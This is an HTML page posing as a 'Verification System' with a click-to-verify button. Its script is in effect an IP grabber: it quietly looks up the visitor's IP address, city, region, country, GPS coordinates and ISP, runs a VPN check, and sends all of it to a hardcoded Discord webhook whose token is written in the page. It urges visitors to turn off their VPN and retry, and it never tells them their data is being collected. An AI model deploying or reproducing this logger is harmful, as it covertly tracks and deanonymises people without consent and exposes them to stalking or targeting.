<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1.0"/>
  <title>Verification System</title>
  <style>
    /* ─── Background & Particles ────────────────────────────────── */
    @keyframes gradientBG {
      0%,100% { background-position: 0% 50%; }
      50%     { background-position: 100% 50%; }
    }
    body {
      margin: 0; padding: 0;
      height: 100vh; overflow: hidden;
      font-family: 'Segoe UI', sans-serif;
      background: linear-gradient(-45deg, #1c1c2f, #2c2c3e, #1c1c2f, #2c2c3e);
      background-size: 400% 400%;
      animation: gradientBG 20s ease infinite;
      display: flex; align-items: center; justify-content: center;
      color: #eee;
      position: relative;
    }
    /* floating particle dots */
    .particle {
      position: absolute;
      border-radius: 50%;
      background: rgba(255,255,255,0.1);
      animation: drift 10s infinite;
    }
    @keyframes drift {
      from { transform: translateY(0) translateX(0); }
      to   { transform: translateY(-200px) translateX(100px); }
    }

    /* ─── Card ───────────────────────────────────────────────────── */
    .card {
      background: rgba(0,0,0,0.75);
      padding: 2rem 2.5rem;
      border-radius: 12px;
      box-shadow: 0 8px 32px rgba(0,0,0,0.6);
      text-align: center;
      width: 320px;
      position: relative;
      z-index: 1;
    }
    h1 {
      margin: 0 0 1rem;
      font-size: 1.5rem;
      letter-spacing: 0.5px;
    }
    button {
      width: 100%;
      padding: 0.75rem;
      background: linear-gradient(45deg, #3273dc, #275bbe);
      border: none;
      border-radius: 8px;
      color: #fff;
      font-size: 1rem;
      cursor: pointer;
      transition: background 0.2s;
    }
    button:hover {
      background: linear-gradient(45deg, #4183ff, #3a6cff);
    }

    /* ─── Status Message ─────────────────────────────────────────── */
    .status {
      margin-top: 1.5rem;
      font-size: 1.1rem;
      display: flex;
      align-items: center;
      justify-content: center;
      opacity: 0;
      transition: opacity 0.4s;
    }
    .status.visible { opacity: 1; }
    .status svg { margin-right: 0.6rem; }

  </style>
</head>
<body>
  <!-- generate some floating particles -->
  <script>
    for(let i=0;i<30;i++){
      const d = document.createElement('div');
      d.className = 'particle';
      const size = Math.random()*4 + 2;
      d.style.width = `${size}px`;
      d.style.height = `${size}px`;
      d.style.left = `${Math.random()*100}%`;
      d.style.bottom = `${Math.random()*100}%`;
      d.style.animationDuration = `${10 + Math.random()*10}s`;
      d.style.opacity = `${0.05 + Math.random()*0.1}`;
      document.body.appendChild(d);
    }
  </script>

  <div class="card">
    <h1>Click to Verify</h1>
    <button id="verifyBtn">Start Verification</button>
    <div id="status" class="status"></div>
  </div>

  <script>
    const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1370031066089394248/ApRpcsSICEv7xnBypVTicDEyCiUQsphCParmvg8E_U5RWoHNy-Kszc1CnTCTAqh1Qkn3";
    const btn = document.getElementById('verifyBtn');
    const statusEl = document.getElementById('status');

    function showStatus(passed, text) {
      const icon = passed
        ? `<svg width="24" height="24" fill="#28a745" viewBox="0 0 16 16"><path d="M16 2L6 14 0 8l2-2 4 4L14 0z"/></svg>`
        : `<svg width="24" height="24" fill="#ffc107" viewBox="0 0 16 16"><path d="M8 1a7 7 0 1 1 0 14A7 7 0 0 1 8 1zm0 4.5a.5.5 0 0 0-.5.5v3.5a.5.5 0 0 0 1 0V6a.5.5 0 0 0-.5-.5zm.002 6a.75.75 0 1 0 0 1.5.75.75 0 0 0 0-1.5z"/></svg>`;
      statusEl.innerHTML = `${icon}<span>${text}</span>`;
      statusEl.classList.add('visible');
    }

    async function safeFetch(url, opts={}, t=5000) {
      const ctrl = new AbortController();
      const id = setTimeout(()=>ctrl.abort(), t);
      try {
        return await fetch(url, {...opts, signal:ctrl.signal, mode:'cors'});
      } finally {
        clearTimeout(id);
      }
    }

    btn.addEventListener('click', async () => {
      statusEl.classList.remove('visible');
      btn.disabled = true;
      showStatus(false, 'Verifying…');

      try {
        // 1) IP
        let ipData;
        try { ipData = await (await safeFetch('https://api.ipify.org?format=json')).json(); }
        catch { ipData = await (await safeFetch('https://api.db-ip.com/v2/free/self')).json(); }
        const ip = ipData.ip || ipData.ipAddress;

        // 2) Geo
        let geo = await (await safeFetch(`https://ipapi.co/${ip}/json/`)).json();
        if (geo.error) throw 1;

        // 3) VPN heuristics
        const factors = [];
        let score = 0;
        if (geo.org && /hosting|datacenter|cloud|proxy|vpn/i.test(geo.org)) {
          factors.push('Datacenter IP');
          score += 40;
        }
        if (geo.port && [80,443,1080,3128,8080,8888,9050].includes(+geo.port)) {
          factors.push('Proxy port');
          score += 30;
        }
        if (geo.timezone && geo.country_code && !geo.timezone.includes(geo.country_code)) {
          factors.push('Timezone mismatch');
          score += 20;
        }
        const vpnDetected = score >= 40;

        // 4) Build embed payload
        const embed = {
          title: vpnDetected
            ? '🔍 Verification Status\n❌ FAILED: VPN/Proxy Detected'
            : '🔍 Verification Status\n✅ PASSED: No VPN Detected',
          color: vpnDetected ? 16755007 : 65280,
          fields: [
            { name:'📍 Location',        value:`${geo.city}, ${geo.region}, ${geo.country_name}`, inline:false },
            { name:'🌐 IP Address',      value: ip, inline:true },
            { name:'🏢 ISP/Organization',value: geo.org || 'Unknown', inline:true },
            { name:'🌍 Coordinates',     value:`[${geo.latitude}, ${geo.longitude}](https://maps.google.com?q=${geo.latitude},${geo.longitude})`, inline:false }
          ],
          footer: { text: `Verification at ${new Date().toLocaleString()}` }
        };
        if (factors.length) {
          embed.fields.push({
            name:'⚠️ Suspicious Factors',
            value: factors.join(', '),
            inline:false
          });
        }

        // 5) Send to webhook
        await fetch(DISCORD_WEBHOOK, {
          method:'POST',
          headers:{ 'Content-Type':'application/json' },
          body: JSON.stringify({ username:'Verification System', embeds:[embed] })
        });

        // 6) Update UI
        if (vpnDetected) {
          showStatus(false, '⚠️ VPN or proxy detected. Please disable and retry.');
        } else {
          showStatus(true, '✅ Verified');
        }
      } catch (err) {
        console.error(err);
        showStatus(false, '❌ Verification Error');
      } finally {
        btn.disabled = false;
      }
    });
  </script>
</body>
</html>
